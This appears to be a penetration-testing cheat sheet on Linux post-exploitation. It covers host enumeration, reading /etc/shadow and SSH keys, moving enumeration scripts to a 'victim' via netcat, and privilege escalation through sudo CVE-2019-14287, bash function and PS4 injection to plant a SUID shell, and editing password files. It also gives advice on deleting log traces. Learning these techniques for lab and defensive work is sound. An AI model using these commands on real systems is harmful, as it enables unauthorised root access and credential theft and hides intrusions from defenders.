# Exploit Linux

<hr class="sl">

## Linux handy commands

<div class="row row-cols-md-2"><div>

Explore the host

* `bash`: start a bash shell
* `cd`: move to another folder
* `ls`: list files in a folder
* `pwd`: path to the current directory
* `cat`: print (usually small) files
* `less`: read (usually big) files
* `chmod`: change permissions
* `chown`: change owner
* `find`: find a file/folder
* `grep/egrep`: find something in a file
* `su`: change user
* `wget`: download something

> You may use python to do things for you, such as starting a web server to browse files <small>(`python3 -m  http.server`)</small>, or run commands <small>(`python -c 'import pty; pty.spawn("/bin/bash")'`)</small>.
</div><div>

Learn more about your environment

* `w`: who is logged in, and what they are doing
* `who`: who is logged in
* `echo $0`: language used by the current shell
* `whoami`: username
* `last`: list of last logged users
* `id`: username, group...
* `uname -a`: info about the machine
* `hostname`: info about the host
* `ps`: see running processes
* `env`: see environment variables
* `umask`: see the default perms on newly created files
* `getent`: shortcut to get entries about something, such as `passwd`
</div></div>

<hr class="sr">

## Linux environment

<div class="row row-cols-md-2 mt-3"><div>

**Look for (sensitive?) information** 🔑

* `/etc/passwd`: usernames, their groups, their home, and their shell
* `/etc/shadow` <small>(root)</small>: username, and their hashed password
* `/etc/group`/`groups`: groups
* `/etc/gshadow` <small>(root)</small>: groups hashed passwords (if any)
* `/proc/version`: information about the machine
* `cat /etc/*release`: information about the operating system
* `/etc/sudoers` <small>(root)</small>: sudoers, and rules applied to them, if any
* `ls -ahl /root/`: see if there are readable files in root's home
* `find / -name *id_dsa* 2> /dev/null`: RSA credentials
  * You can use `ssh -i key` to connect using a key
  * The key must have the permissions `u+rw` at least
  * You can try to crack it

**Logs** 🗺️

* `/var/log/` (folder): log files
* Look for ufw (firewall) logs
* Look for apache logs
* Look for fail2ban logs
* Look for backups <small>(such as emails/conversations/database)</small>
* Look for mails `/var/mail/`
* `~/.bash_history`: there may be something useful in the bash_history
  * Look for calls to sudo
  * Look for calls to services (mysql...)
</div><div>

**Cron tasks** ⭐

Cron are the name given to automated tasks on Linux. See `crontab -l` for the tasks of the current user, and `ls -la /etc/cron*` for every cron tasks. Then, you may look for vulnerable cron tasks, meaning tasks using

* files that you can edit, 
* environment variables using paths/... that you can edit,
* glob-patterns that you may inject, for instance, if a command runs on a directory in which you can create files, you can create files named after the injectable command line flags.

<br>

**Potentially vulnerable services** 😢

* Apache: `apache2 -v` / `apache2ctl -M` / `httpd -v`
* Sudo: `sudo -V`
* PostgresSQL: `psql -V`
* MySQL: `mysql --version`

Once you found a service, look for CVE for the given version, and try to use one to escalate to root.

<br>

**Cleaning up your traces** 🧹

* `/var/log/auth.log`: ssh logs
* `/var/log/syslog`: firewall logs
* `/var/log/service`: "service" logs (ex: apache)
* ...

</div></div>

> **NOTE**: don't forget to redirect any errors with `some_command 2> /dev/null`.

<hr class="sl">

## Linux (automated) enumeration

<div class="row row-cols-md-2"><div>

There are many scripts checking if there are "common" files, testing commands... in order to look for information that would be useful for you to reach a higher level of privilege.

* [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) (10.4k ⭐): a script shell
* [LinEnum](https://github.com/rebootuser/LinEnum) (5.4k ⭐): a script shell
* [traitor](https://github.com/liamg/traitor)  (5.4k ⭐): a script in Go
* [linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) (lse, 2.5k ⭐): a script shell
* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker) (1.1k ⭐): a python script
</div><div>

There are multiple ways to get the script on your target

* Open a text editor, copy-paste it
  * run it `bash script.sh`,
  * or use chmod, then `./script.sh`
* Use `wget` / `curl`
* Use `python` <small>(`sudo python -m SimpleHTTPServer 80` on the host)</small>
* Use `FTP`
* Use nc/netcat
  * On the victim: `nc -l -p port > script.sh`
  * On the attacker: `nc IP port < script.sh`
* Using [penelope](https://github.com/brightio/penelope)
</div></div>

<hr class="sr">

## Linux privilege escalation

<div class="row row-cols-md-2"><div>

Privilege escalation refer to a process of obtaining super-administrator (a.k.a. root) privileges, starting from a non-root user.

* [gtfobins](https://gtfobins.github.io/) (7.4k ⭐): a reference to find ways to exploit a command with misconfigured permissions.
</div><div>

* Find a vulnerable service an exploit it <small>(apache, mysql...)</small>
* Find a service in which you can inject data, in order to exploit it
  * Exploit `sudo`
  * Exploit system files
  * Exploit cron jobs
  * Exploit script/.so/... with the SUID bit
  * ...
* ...
</div></div>

<hr class="sl">

## Misconfigured permissions

<div class="row row-cols-md-2"><div>

If `/etc/shadow` was "intentionally" misconfigured

```bash
$ cat /etc/shadow
# if you can read it: try to bruteforce the password
# if you can write it: change the root password
# (copy a password / generate one mkpasswd -m sha-512 toto)
```

In OLD version of Linux, passwords could be stored in `/etc/passwd`

```bash
$ cat /etc/shadow
- root:x:...
+ root:hashed_password:...
# openssl passwd toto
```
</div><div>

**SUID/GUID**

Scripts having the SUID bit can be executed with the permissions of their owner. GUID is the same, but using the owner group permissions. If you find one, try to see on GTFOBins if you have a well-known way to exploit it.

```bash
$ find / -perm -u=s -type f 2>/dev/null
$ find / -perm -g=s -type f 2>/dev/null
```

If the script "hand-made", or not something on GTFOBins, then you can use `strace script`, and `strings script`. Both commands can be used if the script is "unreadable", to try to find what the script is doing, and maybe find Paths/Environment variables that you may have the permission to edit.
</div></div>

<hr class="sr">

## Exploit sudo

*A good reference to exploit sudo: [SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER)* (1.6k ⭐).

<div class="row row-cols-md-2"><div>

Try to find commands that can be run with sudo

```bash
$ sudo -l
# if asking a password, abort
# otherwise, 
# - look for the command on GTFOBins
# - look for environment variable loaded that may be exploited
$ sudo -n nc # if nc allowed
```
</div><div>

**sudo before 1.8.28 (CVE-2019-14287)**: if a user was allowed to run one specific command using sudo, such as `nc`, then it was possible for any user to bypass the check, and run the command as root.

```bash
$ sudo -u#-1 nc
$ sudo -u#4294967295 nc
```
</div></div>

<hr class="sl">

## Exploit bash

<div class="row row-cols-md-2"><div>

**Bash versions <4.2-048**: it is possible to create functions named after a path, which allow us to execute a command instead. If the path is accessed by a script, then using `-p`, we can create a bash while inheriting the permissions of its creator.

```bash
function /some/path { /bin/bash -p; }
export -f /some/path
```
</div><div>

**Bash <4.4**: if debug is enabled, we can inject code in the environment variable PS4 used by bash. If the script has the SUID bit, then using this, we could create a bash with the SUID bit too.

```bash
$ env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/; chmod +xs /tmp/bash)' ./script
```
</div></div>

<hr class="sr">

## NFS

<div class="row row-cols-md-2"><div>

NFS files are created with the permissions of the remote user. If the remote user is root, and root squashing is disabled, then the files will be created as root.

```bash
# see NFS exports
$ cat /etc/exports
```
</div><div>
</div></div>

<hr class="sl">

## Kernel exploits

<div class="row row-cols-md-2"><div>

Kernel exploits should be used at a last resort, as they will most probably severely impact the machine state.

* [Dirty COW](https://en.wikipedia.org/wiki/Dirty_COW) on Linux kernel <4.8.3
</div><div>

There are two OLD scripts, for OLD Linux Kernels, if needed

* [linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) (3.9k ⭐): still updated with new exploits
* [Linux_Exploit_Suggester](https://github.com/InteliSecureLabs/Linux_Exploit_Suggester) (1.6k ⭐): up to 4.x excluded
* [Linux Kernel Exploit Suggester 2](https://github.com/jondonas/linux-exploit-suggester-2) (1.4k ⭐): up to 5.x excluded
</div></div>

<hr class="sr">

## Random

<div class="row row-cols-md-2"><div>

The Fork bomb is an attack wherein a process continually replicates itself to deplete available system resources, according to [Wikipedia](https://en.wikipedia.org/wiki/Fork_bomb).
</div><div>
</div></div>